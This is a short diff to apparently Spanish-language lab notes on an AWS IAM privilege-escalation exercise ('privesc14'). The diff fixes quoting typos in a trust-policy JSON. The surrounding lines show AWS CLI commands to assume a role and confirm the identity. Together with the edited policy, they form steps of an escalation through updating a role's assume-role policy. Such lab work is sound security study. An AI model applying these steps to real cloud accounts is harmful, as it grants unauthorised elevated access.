@@ -5,16 +5,17 @@ aws iam get-policy-version --policy-arn arn:aws:iam::651927172911:policy/privesc
 aws sts assume-role --role-arn arn:aws:iam::651927172911:role/privesc14-UpdatingAssumeRolePolicy-role --role-session-name privesc14  
 aws sts get-caller-identity --profile privesc14  
 Crear un archivo assume-role-policy.json  
+
 ```json
 {
   "Version": "2012-10-17",
   "Statement": [
     {
-      "Effect"": "Allow",
+      "Effect": "Allow",
       "Principal": {
         "AWS": "arn:aws:sts::651927172911:assumed-role/privesc14-UpdatingAssumeRolePolicy-role/privesc14"
       },
-      "Action"": "sts:AssumeRole",
+      "Action": "sts:AssumeRole",
       "Condition": {}
     }
   ]
